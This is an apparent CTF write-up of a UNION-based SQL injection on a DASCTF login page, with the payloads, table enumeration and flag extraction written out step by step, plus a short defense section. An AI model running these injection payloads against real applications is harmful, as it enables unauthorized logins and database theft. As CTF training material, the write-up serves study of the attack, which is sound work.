# Attack Report -- dasctf-login-union-sqli

**Generated:** 2026-07-17
**Target:** http://e1a1dbb98b5ada131e04877a.http-ctf2.dasctf.com:80

## Target Summary

- **URL/IP:** http://e1a1dbb98b5ada131e04877a.http-ctf2.dasctf.com:80
- **Technologies detected:**
  - OpenResty (nginx + Lua)
  - PHP 7.3.11
  - MariaDB (from SQL error messages)
- **Key HTTP headers:**
  - `Server: openresty`
  - `X-Powered-By: PHP/7.3.11`

## Vulnerability Discovered

- **Type:** SQL Injection (UNION-based, login bypass, no keyword filter)
- **Location:** GET parameter `username` at `/check.php`
- **How it was found:** Page title "用户登陆" (User Login) with hidden 5px text "用 sqlmap 是没有灵魂的". Injecting `admin'` triggered a MariaDB syntax error. `admin' OR '1'='1` bypassed login. Unlike the previous dasctf challenge, this one has no keyword filter — `SELECT`, `UNION`, `WHERE`, `.` all pass through.

## Exploitation Chain

**Step 1 — Recon:**
```
curl http://target:80
```
Login form at `/check.php?username=&password=` (GET method). Challenge text: "I hid the flag somewhere else this time."

**Step 2 — Injection confirmed:**
```
check.php?username=admin'&password=x
→ MariaDB error 1064: syntax error near ''x'' at line 1
```

**Step 3 — Login bypass + echo position discovery:**
```
check.php?username=admin' OR '1'='1&password=x
→ Login Success! Hello admin! Your password is '239b7b362835f3ca1d5e283cc4ede093'
```
Admin password hash revealed (not the flag). Query returns 3 columns with echo at positions 2 (username) and 3 (password).

**Step 4 — UNION with fake username (suppresses original row):**
```
check.php?username=nobody' UNION SELECT 1,2,3-- -&password=x
→ Login Success! Hello 2! Your password is '3'
```

**Step 5 — Database and table enumeration:**
```
database()                     → geek
information_schema.tables      → geekuser, l0ve1ysq1
information_schema.columns     → l0ve1ysq1: id, username, password
```

**Step 6 — Flag extraction (row 16 of l0ve1ysq1):**
```
nobody' UNION SELECT 1,group_concat(id,'~',username,'~',password SEPARATOR '|'),3 FROM l0ve1ysq1-- -
→ 16~flag~CTF2{7a4057c6-8e9f-4bb5-b2ac-4d1e146671d5}
```

## Flag(s) Captured

| Flag | Location | Method |
|------|----------|--------|
| `CTF2{7a4057c6-8e9f-4bb5-b2ac-4d1e146671d5}` | table `l0ve1ysq1`, row 16, username=`flag` | UNION SELECT, no filter |


## Lessons Learned

- **Root cause:** User input (`$_GET['username']`) concatenated directly into SQL: `SELECT id, username, password FROM users WHERE username='$input' AND password='...'`. No input sanitization, no parameterized queries.
- **Defense:** Use prepared statements (PDO/mysqli). Apply least-privilege DB accounts — the web user should not have `information_schema` access. Use a fake username (`nobody'`) to suppress the original query row, allowing UNION data to display.
- **Dead ends:** `AND 1=2` to suppress the original row didn't work (still showed admin data), but using a non-existent username (`nobody'`) achieved the same result cleanly. The admin's MD5 hash `239b7b362835f3ca1d5e283cc4ede093` was a red herring — the flag was in a separate table `l0ve1ysq1`, not in `geekuser`.

## Files Saved

### recon/
- `headers.txt` — HTTP response headers (openresty, PHP/7.3.11)
- `index-source.html` — Login form with hidden hints

### exploits/
- `union-db.txt` — Database name: `geek`
- `union-tables.txt` — Tables: `geekuser`, `l0ve1ysq1`
- `union-cols-flag.txt` — Columns: id, username, password
- `union-flag-data.txt` — Full dump of `l0ve1ysq1` (17 rows), flag at row 16

### flags/
- `flag.txt` — CTF2{7a4057c6-8e9f-4bb5-b2ac-4d1e146671d5}
- `found-flags.txt` — Automated find-flag.sh output
